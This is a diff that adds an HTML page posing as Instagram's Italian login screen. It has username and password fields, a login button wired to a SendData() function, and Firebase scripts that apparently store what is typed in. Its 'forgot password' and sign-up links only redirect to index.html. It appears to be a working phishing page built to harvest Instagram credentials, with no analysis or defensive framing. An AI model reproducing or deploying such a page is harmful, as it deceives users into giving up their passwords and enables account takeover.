@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="it" dir="ltr">
+<link rel="stylesheet" href="index.css">
+  <head>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <meta name="viewport" content="width=device-width, user-scalable=no,
+    initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
+    <link rel="shortcut icon" type="image/x-icon" href="instagram.png" />
+    <meta charset="utf-8">
+    <title>Instagram</title>
+
+    <center>
+      <img src="instagram.string.png" alt="" style="height:40px; margin-top:65px">
+    </center>
+    <center>
+      <input id="Nome" type="email" name="" value="" placeholder="Numero di telefono, nome utente o e-mail" style="height:40px; width:70%; margin-top:55px; padding-left:8px; border-color:transparent; border-radius:5px;box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.1), 0 5px 5px 0 rgba(0, 0, 0, 0.1); text-color:grey; font-size:12px;">
+      <input id="Password" type="password" name="" value="" placeholder="Password" style="height:40px; width:70%; margin-top:20px; padding-left:8px; border-color:transparent; border-radius:5px;box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.1), 0 5px 5px 0 rgba(0, 0, 0, 0.1); text-color:grey; font-size:12px;">
+      <p style="font-size:12px;font-family: 'Roboto', sans-serif;margin-top:25px;color:rgba(var(--d69,0,149,246),1);" onclick="go()">Hai dimenticato la password?</p>
+      <button id="btnAccedi"  class="btn" onclick="SendData()" type="button" name="button" style="height:35px; width:70%;font-size:12px;font-family: 'Roboto', sans-serif;color:white;background-color:rgba(var(--d69,0,149,246),1); margin-top:25px; padding-left:8px; border-color:transparent; border-radius:5px;box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.1), 0 5px 5px 0 rgba(0, 0, 0, 0.1);" >Accedi</button>
+      <p style="font-size:12px;font-family: 'Roboto', sans-serif;margin-top:25px;color:grey">Non hai un account? <span style="color:rgba(var(--d69,0,149,246),1);" onclick="go()">Iscriviti</span></p>
+
+    </center>
+    <script type="text/javascript">
+      function go(){
+        window.location = "index.html";
+      }
+    </script>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <script src="Firebase.js"></script>
+
+  </head>
+  <body>
+  </body>
+    </html>
+  </body>
+</html>
